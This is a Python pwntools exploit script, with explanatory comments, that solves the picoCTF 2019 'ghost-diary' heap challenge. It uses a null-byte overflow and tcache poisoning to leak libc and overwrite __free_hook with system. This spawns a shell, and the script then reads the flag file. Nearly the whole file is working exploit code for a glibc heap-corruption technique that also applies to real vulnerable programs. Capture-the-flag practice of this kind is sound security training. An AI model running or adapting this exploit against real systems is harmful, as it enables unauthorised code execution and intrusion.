#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --user xxx --pass 'xxx' --path /problems/ghost-diary_5_7e39864bc6dc6e66a1ac8f4632e5ffba/ghostdiary
from pwn import *
import time
import re

# Set up pwntools for the correct architecture
# ELF tutorial: https://github.com/Gallopsled/pwntools-tutorial/blob/master/elf.md
exe = context.binary = ELF('ghostdiary')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 22)
user = args.USER
password = args.PASSWORD
remote_path = '/problems/ghost-diary_5_7e39864bc6dc6e66a1ac8f4632e5ffba/ghostdiary'
remote_dir = '/problems/ghost-diary_5_7e39864bc6dc6e66a1ac8f4632e5ffba'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        # `cwd` is needed here because the `vuln` executable does not use absolute paths, so we
        # must be in the folder that contains the flag.
        return shell.process([remote_path] + argv, cwd=remote_dir, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def alloc(size):
    io.sendline("1")
    io.sendlineafter(">", "2" if size > 0x100 else "1")
    io.sendlineafter(":", str(size))
    io.recvuntil(">")

def edit(idx, payload="AAAA"):
    io.sendline("2")
    io.sendlineafter(":", str(idx))
    io.sendafter(":", payload)
    io.recvuntil(">")

def free(idx):
    io.sendline("4")
    io.sendlineafter(":", str(idx))
    io.recvuntil(">")

io = start()

io.recvuntil(">")

# prepare to overcome tcache on the 0x118 bin by creating 7 chunks that
# will later be used to fill the 0x118 tcache bin
log.info("Prepare chunks to overcome tcache 0x118 bin")
for i in range(7):
    alloc(0x118)

log.info("Allocate chunks A, B, and C")
alloc(0x118) # 7
alloc(0x118) # 8
alloc(0x118) # 9
alloc(0x40) # prevents consolidation with wilderness

# prepare to overcome tcache on the 0x88 bin by creating 7 chunks that
# will later be used to fill the 0x88 tcache bin
log.info("Prepare chunks to overcome tcache 0x88 bin")
for i in range(7):
    alloc(0x88)

log.info("Edit chunk B to create a fake chunk header with a `prev_size` value of 0x100")
edit(8, b"A" * 0xf0 + p64(0x100) + b"\n")

# free the first 7 chunks of size 0x118 into tcache so that the 8th chunk goes to the unsorted list
log.info("Fill tcache 0x118 bin with chunks allocated earlier")
for i in range(7):
    free(i)

log.info("Free chunk B to the unsorted list")
free(8)

# edit chunk 7, which has not been freed, and fill it up so that the null byte
# overflows into chunk B
log.info("Execute null byte overflow into chunk B to modify size")
edit(7, "A" * 0x118)

# allocate a new block of memory
# this will split block B (into B1 and B2) since the heap manager will search
# the unsorted list for a suitable chunk and it will end up splitting chunk B
# into `0x88` (user requested) and `0x90` (remainder). block B1 is now the first
# "entry" in the "diary"
log.info("Split chunk B into B1 and B2 by creating a chunk of size 0x88")
alloc(0x88)

# read entry zero from the diary. the content is the libc leaked address.
log.info("Leak libc by reading chunk B1 (entry 0)")
io.sendline("3")
io.sendlineafter(":", "0")
io.recvuntil(": ")

leak = u64(io.recvline(keepends=False).ljust(8, b"\x00"))
libc_base = leak - 0x7f4592fbfd90 + 0x00007f4592bd4000
log.info("Leaked libc: {}".format(hex(leak)))
log.info("Libc base: {}".format(hex(libc_base)))

# calculate important offsets
free_hook = libc_base + 4118760 # libc.symbols["__free_hook"]
system = libc_base + 324672 # libc.symbols["system"]
log.info("__free_hook: {}".format(hex(free_hook)))
log.info("system: {}".format(hex(system)))

io.recvuntil(">")

# call `malloc` again to get our chunk that we’ll collapse over.
# this splits chunk B2 and returns a pointer to chunk B3
log.info("Call `malloc` to get our chunk that we’ll collapse over")
alloc(0x30)

# execute the tcache block we set up at the beginning for size 0x88.
# free the 7 chunks of size 0x88 into tcache so that the 8th chunk goes to the unsorted list
log.info("Fill tcache 0x88 bin with chunks allocated earlier")
for i in range(11, 18):
    free(i)

log.info("Free chunk B1 (size 0x88) to ensure that a proper `prev_size` header is written")
free(0)

log.info("Free chunk C to backwards consolidate over B2, resulting in overlapping chunks")
free(9)

# now that we have overlapping chunks and control chunk B2, we can free chunk B2
# so it goes in the tcache
log.info("Free chunk B2 so it goes into the tcache")
free(1)

# Create a chunk of size 0x130 to allocate our consolidated, overlapping chunk
# into page 0 of the "diary"
log.info("Create a chunk of size 0x130 to allocate the overlapping chunk")
alloc(0x130)

# The next section is similar to lines 97-128 of the "zero_to_hero" script.py
# Overwrite the forward address of chunk B2 with the address of `free_hook`
# by using our overlapped chunks and writing directly into B2. Also, specify
# the argument to `system()` to be `/bin/sh`
log.info("Overwrite the forward address of chunk B2 to `__free_hook` by using overlapped chunks")
edit(0, b"/bin/sh".ljust(0x88, b"\x00") + p64(0) + p64(free_hook) + b"\n")
# Request the next block from the tcache list, leaving the head of the list pointing at the
# forward pointer of the chunk we just freed. We overwrote this forward pointer to `free_hook`.
log.info("Remove chunk B2 from the tcache list, leaving the head pointing at `__free_hook`")
alloc(0x30)
# Then, request the next chunk from the same tcache list. This will return a pointer to `free_hook`.
log.info("Request the next chunk from the same tcache list to add a pointer to `__free_hook` to the diary.")
alloc(0x30)
# Set the address that page 2 points to, which is actually free_hook, to `system`
log.info("Set `__free_hook` to `system('/bin/sh')` by editing the page that points to `__free_hook`")
edit(2, p64(system) + b"\n")

# We overwrote the `__free_hook` pointer to the `system('/bin/sh')` function. So, now we
# actually have to use our overwritten memory by calling `free()`, which redirects its
# actions to whatever function `__free_hook` happens to point to.
log.info("Call `free()`, which will run `__free_hook` and therefore run `system('/bin/sh')`")
io.sendline("4")
io.sendlineafter(":", "0")

# now that we have a shell, simply print `flag.txt`
log.info("Run `cat flag.txt` in the shell, regex match the flag, and print it")
io.sendline("cat flag.txt")
# store the output until the end of the flag
output = io.recvuntil("}")
# search for the flag in the output
flag = re.search("picoCTF{.*?}", output.decode("ascii")).group()
# log the flag
log.success(flag)
